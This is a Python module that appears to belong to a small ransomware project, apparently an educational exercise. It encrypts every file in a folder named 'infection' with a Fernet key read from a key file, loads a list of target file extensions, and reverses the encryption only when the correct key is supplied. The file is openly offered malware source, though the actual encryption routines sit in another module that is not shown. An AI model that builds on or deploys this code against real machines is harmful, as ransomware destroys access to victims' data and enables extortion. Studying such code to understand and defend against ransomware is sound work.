from os import listdir
from cryptography.fernet import Fernet
from lib.bcolors import bcol
from lib import crypt

def files_treat(extensions, crypt, silence, key):
    """
    Unifies the program modes and runs it.
    """
    folder = "infection"
    if key == "":
        with open("utils/key.key", "rb") as mykey:
                key = mykey.read()
    k = Fernet(key)
    for count, filename in enumerate(listdir(folder)):
        src = folder + '/' + filename
        switch_crypt(extensions, crypt, src, k, silence)

def call_rev_files(extensions, key, silence):

    mode = "rev"
    if check_key(key) == 1:
        files_treat(extensions, mode, silence, key)
    else:
        print(bcol.FAIL + "ERROR: Invalid syntax or incorrect key.\n" + bcol.ENDC)

def check_key(inputkey):

    with open("utils/key.key", "r") as mykey:
            key = mykey.read()
    if not inputkey == key:
        return None
    else:
        return 1

def load_list_ext():
    txt_file = open("lib/ext/extensions.txt", "r")
    content = txt_file.read()
    content_list = content.split('\n')
    txt_file.close()
    return content_list

def switch_crypt(extensions, mode, src, k, silence):

    if mode == "rev":
        crypt.decrypt_file(src, k, silence)
    else:
        crypt.encrypt_file(extensions, src, k, silence)
